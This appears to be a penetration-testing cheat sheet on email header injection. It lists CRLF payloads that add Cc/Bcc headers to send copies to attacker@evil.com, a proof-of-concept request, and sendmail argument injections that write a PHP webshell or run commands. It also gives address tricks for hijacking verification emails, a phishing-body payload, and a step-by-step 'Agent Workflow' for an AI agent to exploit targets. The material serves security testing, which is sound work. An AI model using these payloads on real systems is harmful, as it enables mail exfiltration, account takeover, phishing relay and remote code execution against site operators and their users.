# Email Injection

> **Summary**: Injection of arbitrary email headers or body content through unsanitized user input in web application mail-sending functionality.
> **Impact**: Spam relay, phishing from trusted domains, data exfiltration, account takeover via verification email manipulation, and in some cases remote code execution via sendmail parameters.
> **Typical Severity**: Medium | High (when RCE via sendmail is possible)

---

## Detection

### Indicators
- Web forms that send emails (contact forms, password reset, invite features, newsletter subscription)
- User-controlled input reflected in email headers (`From`, `To`, `Subject`, `CC`, `BCC`)
- Applications using PHP `mail()` function or direct SMTP commands
- Email bodies constructed from user-supplied templates

### Automated Detection
```bash
# Test for CRLF injection in email parameters with Burp Suite
# Inject %0ACc:attacker@evil.com in every parameter that ends up in an email

# Use ffuf to fuzz email header injection points
ffuf -u "https://<TARGET>/contact?email=test%40test.comFUZZ" \
  -w /usr/share/seclists/Fuzzing/CRLF-injection.txt \
  -mc all -fr "invalid"
```

### Manual Detection
1. Identify any form or API endpoint that triggers an email (contact, feedback, invite, share, password reset)
2. Inject CRLF characters (`%0A`, `%0D%0A`, `%0D`) followed by additional headers (`Cc:`, `Bcc:`, `To:`, `Subject:`)
3. Check if the injected headers appear in the received email
4. Test the email body by injecting two newlines (`%0A%0A`) followed by arbitrary content
5. If the application uses PHP `mail()`, test the 5th parameter for sendmail argument injection

---

## Exploitation

### Prerequisites
- A web form or API that sends email based on user-supplied input
- Insufficient sanitization of newline characters (`\r`, `\n`) in email header fields
- For sendmail exploitation: user input reaching the `$additional_parameters` argument of PHP `mail()`

### Step-by-Step

1. **Identify injection point** -- Submit a form and intercept the request; look for parameters that map to email fields (sender, recipient, subject, body)
   - Success: parameter values appear in the email headers or body
2. **Test for header injection** -- Append `%0ACc:attacker@evil.com` to a parameter value
   - Success: attacker receives a copy of the email
3. **Inject BCC for stealth** -- Use `%0ABcc:attacker@evil.com` to receive a blind copy
   - Success: email arrives at attacker address without visible trace
4. **Override subject** -- Inject `%0ASubject:Phishing%20Subject`
   - Success: email subject is changed or a second Subject header is added
5. **Modify body** -- Inject `%0A%0AAttacker-controlled body content` to override the message body
   - Success: recipients see attacker-controlled content in the email body
6. **Sendmail parameter injection (PHP)** -- If `mail()` 5th param is reachable, inject `-X/var/www/html/shell.php` to log output to a web-accessible file
   - Success: PHP file is written to the web root

### Payloads

#### Header Injection (CC/BCC)
```
# Inject CC
sender@domain.com%0ACc:attacker@evil.com

# Inject BCC
sender@domain.com%0ABcc:attacker@evil.com

# Inject additional To
sender@domain.com%0ATo:attacker@evil.com

# Override Subject
sender@domain.com%0ASubject:Password%20Reset%20Required

# Full body override
sender@domain.com%0A%0AThis%20is%20a%20phishing%20message.%0AClick%20here:%20http://evil.com
```

#### PHP mail() 5th Parameter (Sendmail Argument Injection)
```bash
# Write email log to web-accessible file
-X/var/www/html/rce.php

# Specify additional config file (Sendmail MTA)
-C/tmp/evil.cf

# Specify alternative queue directory (Postfix)
-qR

# Read body from file (Exim)
-be ${run{/bin/id}}
```

#### Email Address Tricks for Verification Bypass
```
# Sub-addressing (plus tagging) -- ignored by most servers
victim+attacker@domain.com

# Comments in parentheses
victim(attacker)@domain.com

# IP-based domain
user@[127.0.0.1]
user@[IPv6:2001:db8::1]

# Encoded email atoms (RFC 2047 encoding)
=?utf-8?q?=61=62=63?=@example.com

# Null byte truncation in verification flows
=?x?q?attacker=40evil.com=3e=00?=victim@example.com
```

### Proof of Concept
```http
POST /contact HTTP/1.1
Host: <TARGET>
Content-Type: application/x-www-form-urlencoded

name=Test&email=legitimate@test.com%0ABcc:attacker@evil.com&message=Hello
```

Expected result: `attacker@evil.com` receives a blind copy of the contact form email sent by the application.

---

## Bypasses

- **Double encoding**: `%250A` if the application decodes twice
- **Unicode newlines**: `\u2028` (Line Separator), `\u2029` (Paragraph Separator)
- **Mixed CRLF sequences**: `%0D%0A`, `%0D`, `%0A` -- try all variants as servers parse differently
- **Header folding**: use `%0A%20` or `%0A%09` (newline followed by space/tab) to continue a header
- **Null bytes**: `%00` after injected header to truncate further processing
- **Encoded email atoms**: Use RFC 2047 encoding (`=?charset?encoding?data?=`) to smuggle characters past validation as described in PortSwigger research on email splitting

---

## Escalation

- **Phishing at scale**: Inject BCC with hundreds of addresses to use the trusted server as a spam relay
- **Account takeover via verification email hijack**: Manipulate email address encoding to redirect verification/password-reset emails to attacker-controlled addresses
- **RCE via sendmail**: Exploit PHP `mail()` 5th parameter to write files, read configuration, or execute commands depending on the MTA (Sendmail, Postfix, Exim)
- **SPF/DKIM/DMARC pass**: Emails sent through the application's legitimate mail server will pass authentication checks, making phishing highly effective
- **Internal network probing**: If the mail server is internal, injection can be used to probe internal services
- **Chain with [SSTI](ssti.md)**: If email templates use a templating engine, inject template expressions in the body for server-side template injection
- **Chain with [CRLF](crlf.md)**: Email header injection is a specific case of CRLF injection

---

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite | Intercept and modify email-related parameters, test CRLF injection |
| [Swaks](https://github.com/jetmore/swaks) | `swaks --to victim@target.com --from attacker@evil.com --header "X-Test: injected"` -- Swiss Army Knife for SMTP testing |
| ffuf | Fuzz email parameters with CRLF payloads |
| [PHPMailer Exploit](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html) | Reference for PHP mail() sendmail parameter injection |
| Burp Turbo Intruder | Fuzz encoded email atom combinations for verification bypass |
| [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) | Burp extension for email splitting attack encoding |

---

## Agent Workflow
> Step-by-step instructions for an AI agent to test for email injection.

### Phase 1: Discovery
1. Identify all email-sending functionality: contact forms, invite features, share-by-email, newsletter subscription, password reset, email verification, feedback forms.
2. For each feature, intercept the request and identify parameters that map to email fields (sender, recipient, subject, body, CC, BCC, reply-to).
3. Submit a test value and check if any parameter values appear in the received email headers or body.
4. Identify the backend technology: check if PHP `mail()` is used (common in PHP apps), or if the app uses SMTP directly.

### Phase 2: Validation
1. Test for CRLF header injection by appending `%0ACc:<YOUR_TEST_EMAIL>` to a parameter value:
   ```http
   POST /contact HTTP/1.1
   name=Test&email=legitimate@test.com%0ACc:<YOUR_TEST_EMAIL>&message=Hello
   ```
   If you receive a copy of the email at `<YOUR_TEST_EMAIL>`, header injection is confirmed.
2. Test BCC injection: `%0ABcc:<YOUR_TEST_EMAIL>` for stealth delivery.
3. Test subject override: `%0ASubject:Injected%20Subject`.
4. Test body injection: `%0A%0AInjected body content`.
5. Try all CRLF variants: `%0D%0A`, `%0D`, `%0A`, `%250A` (double encoding), `\u2028`, `\u2029`.

### Phase 3: Exploitation
1. **Header injection**: Add CC/BCC to send copies of application emails to attacker-controlled addresses.
2. **Subject/body override**: Modify email content for phishing from a trusted domain.
3. **Sendmail parameter injection** (PHP `mail()` 5th param): Inject `-X/var/www/html/shell.php` to write a file to the web root.
4. **Email atom splitting**: Use RFC 2047 encoding (`=?utf-8?q?...?=`) to smuggle characters past validation and redirect verification emails.
5. **Spam relay**: Inject BCC with many addresses to use the trusted server as a spam relay.

### Phase 4: Escalation
1. **Phishing from trusted domain**: Inject attacker-controlled content in emails sent from the legitimate server (passes SPF/DKIM/DMARC).
2. **Account takeover via verification email hijack**: Manipulate email address encoding to redirect password-reset or verification emails to attacker-controlled addresses.
3. **RCE via sendmail**: If PHP `mail()` 5th parameter is reachable, write a PHP webshell or read sensitive configuration.
4. **Chain with SSTI**: If email templates use a templating engine, inject template expressions for server-side template injection.

## Decision Tree

```
Start: Identify email-sending functionality
  |
  +---> Parameter reflected in email headers?
  |       +---> Yes: Test CRLF injection (%0A, %0D%0A)
  |       |       +---> CC/BCC injection works? --> Email relay, phishing
  |       |       +---> Subject override works? --> Phishing content
  |       |       +---> Body injection works? --> Full content control
  |       +---> Blocked: Try double encoding (%250A), Unicode newlines
  |
  +---> PHP mail() used?
  |       +---> Test 5th parameter: -X/var/www/html/shell.php --> RCE
  |       +---> Test -C for config injection
  |
  +---> Email verification/reset flow?
          +---> Test RFC 2047 encoded atoms to redirect emails
          +---> Test sub-addressing (victim+attacker@domain.com)
          +---> Test null byte truncation in email address
```

## Success Criteria
- [ ] Email-sending functionality identified with user-controlled parameters
- [ ] CRLF injection confirmed: attacker receives a copy of the email via CC/BCC injection
- [ ] If subject/body override: email content successfully modified
- [ ] If sendmail injection: file written to web-accessible path or RCE achieved
- [ ] If email redirect: verification/reset email arrives at attacker-controlled address

## References

- [HackTricks - Email Injections](https://book.hacktricks.wiki/pentesting-web/email-injections.html)
- [Pwning PHP mail() for Fun and RCE](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [PortSwigger Research - Splitting the Email Atom](https://portswigger.net/research/splitting-the-email-atom)
- [InfoSec Institute - Email Injection](https://resources.infosecinstitute.com/email-injection/)
- Related: [CRLF Injection](crlf.md), [SSTI](ssti.md), [Command Injection](command-injection.md)
